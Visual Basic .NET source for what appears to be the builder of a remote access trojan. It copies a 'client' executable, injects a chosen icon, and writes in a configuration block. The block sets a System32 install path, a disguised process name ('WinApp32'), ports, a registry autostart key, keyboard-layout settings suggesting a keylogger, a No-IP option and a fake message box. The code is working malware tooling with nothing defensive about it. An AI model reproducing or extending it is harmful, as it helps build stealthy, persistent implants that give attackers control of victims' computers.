Public Class EditMain
    Dim NomeF As String
    Private Const Banana2 As String = "<Aggiusta>"
    Dim NomeCli As String
    Private Sub EditMain_FormClosing(ByVal sender As Object, ByVal e As System.Windows.Forms.FormClosingEventArgs) Handles Me.FormClosing
        End
    End Sub

    Private Sub cmdNClient_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles cmdNClient.Click
        Try
            Dim dlgnew As New OpenFileDialog
            dlgnew.Filter = "Exe files|*.exe"
            dlgnew.FileName = ""
            dlgnew.ShowDialog()
            If Not dlgnew.FileName = "" Then
                NomeF = dlgnew.FileName
                dlgnew.FileName = ""
                Dim Edit As String

                FileOpen(111, NomeF, OpenMode.Binary, OpenAccess.Read, OpenShare.Shared)
                Edit = Space(0)
                FileGet(111, Edit)
                FileClose(111)

                If Not InStr(Edit, Banana2) Then
                    lstInfoC.Items.Clear()
                    lstInfoC.Items.Add("Editable: YES")
                    lstInfoC.Items.Add("File version: 1.0.0.0")
                    lstInfoC.Items.Add("Ready for editing: YES")
                    lstInfoC.Items.Add("Client name: " & Split(NomeF, "\")(UBound(Split(NomeF, "\"))))
                    lstInfoC.Items.Add("Path: " & NomeF)
                    MsgBox("Client OK!", MsgBoxStyle.Information)
                    NomeCli = InputBox("What would you like to set the client name to?")
                    If Not NomeCli = "" Then
                        If Dir(Application.StartupPath & "\" & NomeCli & ".exe") = "" Then
                            IO.File.Copy(NomeF, Application.StartupPath & "\" & NomeCli & ".exe")
                        Else
                            MsgBox("The file already exists!", MsgBoxStyle.Critical)
                        End If
                    End If

                Else
                    lstInfoC.Items.Clear()
                    lstInfoC.Items.Add("Editable: NO")
                    lstInfoC.Items.Add("File version: 1.0.0.0")
                    lstInfoC.Items.Add("Ready for editing: NO")
                    lstInfoC.Items.Add("Client name: " & Split(NomeF, "\")(UBound(Split(NomeF, "\"))))
                    lstInfoC.Items.Add("Path: " & NomeF)
                    MsgBox("The selected client has been already edited!", MsgBoxStyle.Critical)
                End If

            End If

        Catch ex As Exception
            MsgBox("Error: " & vbCrLf & ex.Message, MsgBoxStyle.Critical)
        End Try
    End Sub

    Private Sub cmdBuiC_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles cmdBuiC.Click
        Try


            If IO.File.Exists(Application.StartupPath & "\" & NomeCli & ".exe") = True Then

                If chkIC.Checked = True Then
                    If Not txtPathIC.Text = "" Then
                        IconChanger.InjectIcon(Application.StartupPath & "\" & NomeCli & ".exe", txtPathIC.Text)
                        txtLog.Text = txtLog.Text & "Icon changed!" & vbCrLf
                    End If
                End If

                Dim BinStrwe2 As String

                FileOpen(213, Application.StartupPath & "\" & NomeCli & ".exe", OpenMode.Binary, OpenAccess.ReadWrite, OpenShare.Shared)
                BinStrwe2 = Space(LOF(213) - 144)
                FileGet(213, BinStrwe2)
                FilePut(213, BinStrwe2)
                If Not txtpIN.Text = "" Then
                    FilePut(213, Banana2 & txtpIN.Text & Banana2)
                    txtLog.Text = txtLog.Text & "Path name set!" & vbCrLf
                Else
                    FilePut(213, Banana2 & "C:\Windows\System32" & Banana2)
                    txtLog.Text = txtLog.Text & "Path name set!" & vbCrLf
                End If

                If Not txtProR.Text = "" Then
                    FilePut(213, txtProR.Text & Banana2)
                    txtLog.Text = txtLog.Text & "Process name set!" & vbCrLf
                Else
                    FilePut(213, "WinApp32" & Banana2)
                    txtLog.Text = txtLog.Text & "Process name set!" & vbCrLf
                End If

                FilePut(213, nudG.Value & Banana2)
                FilePut(213, nudS.Value & Banana2)
                FilePut(213, nudW.Value & Banana2)
                FilePut(213, nudU.Value & Banana2)
                FilePut(213, nudD.Value & Banana2)
                FilePut(213, nudSD.Value & Banana2)
                FilePut(213, nudK.Value & Banana2)
                txtLog.Text = txtLog.Text & "Ports set!" & vbCrLf


                If chkKDEF.Checked = True Then
                    FilePut(213, "SystemStart" & Banana2)
                    txtLog.Text = txtLog.Text & "Registry key set (DEFAULT)" & vbCrLf
                End If

                If rgRanK.Checked = True Then
                    If Not txtRANK.Text = "" Then
                        FilePut(213, txtRANK.Text & Banana2)
                        txtLog.Text = txtLog.Text & "Registry key set" & vbCrLf
                    Else
                        FilePut(213, "SystemStart" & Banana2)
                        txtLog.Text = txtLog.Text & "Registry key set (DEFAULT)" & vbCrLf
                    End If
                End If

                If rbutIK.Checked = True Then
                    FilePut(213, "It" & Banana2)
                    txtLog.Text = txtLog.Text & "Keyboard type key set (ITALIAN)" & vbCrLf
                End If

                If rbutEK.Checked = True Then
                    FilePut(213, "En" & Banana2)
                    txtLog.Text = txtLog.Text & "Keyboard type key set (ENGLISH)" & vbCrLf
                End If


                If chkFNI.Checked = True Then
                    FilePut(213, "True" & Banana2)
                    txtLog.Text = txtLog.Text & "Fuck NO-IP set (TRUE)" & vbCrLf
                Else
                    txtLog.Text = txtLog.Text & "Fuck NO-IP set (FALSE)" & vbCrLf
                End If

                If txtTi.Text = "" Then
                    If txtBo.Text = "" Then
                        FilePut(213, "" & Banana2)
                        FilePut(213, "" & Banana2)
                    Else
                        FilePut(213, txtTi.Text & Banana2)
                        FilePut(213, txtBo.Text & Banana2)
                        txtLog.Text = txtLog.Text & "Message set" & vbCrLf
                    End If
                Else
                    FilePut(213, txtTi.Text & Banana2)
                    FilePut(213, txtBo.Text & Banana2)
                    txtLog.Text = txtLog.Text & "Message set" & vbCrLf
                End If


                FileClose(213)
                txtLog.Text = txtLog.Text & "----Client successfully generated----" & vbCrLf
                MsgBox("Client successfully generated in " & Application.StartupPath)
            Else
                MsgBox("The backup file does not exist, reload the client!", MsgBoxStyle.Exclamation)
            End If


        Catch ex As Exception
            MsgBox("Error in editing client: " & vbCrLf & ex.Message, MsgBoxStyle.Critical)
        End Try
    End Sub


    Public Function GeneraRan(ByVal Lunghezza As Integer) As String

        Dim naso As System.Security.Cryptography.RandomNumberGenerator = _
        System.Security.Cryptography.RandomNumberGenerator.Create
        Dim Simbolo(0) As Byte
        Dim ConvertitoreSpalla As New System.Text.ASCIIEncoding
        Dim risultato As String = ""

        Do While (risultato.Length < Lunghezza)
            naso.GetBytes(Simbolo)
            Dim st As String = ConvertitoreSpalla.GetString(Simbolo)
            If Char.IsLetterOrDigit(st(0)) Then risultato &= st(0)
        Loop

        Return risultato

    End Function


    Private Sub cmdGK_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles cmdGK.Click
        txtRANK.Text = GeneraRan(10)
    End Sub

    Private Sub cmdSI_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles cmdSI.Click
        Try
            Dim dlgnew2 As New OpenFileDialog
            dlgnew2.Filter = "Icon files|*.ico"
            dlgnew2.FileName = ""
            dlgnew2.ShowDialog()
            If Not dlgnew2.FileName = "" Then
                txtPathIC.Text = dlgnew2.FileName
            End If
        Catch ex As Exception
            MsgBox("Error: " & vbCrLf & ex.Message, MsgBoxStyle.Critical)
        End Try
    End Sub
End Class
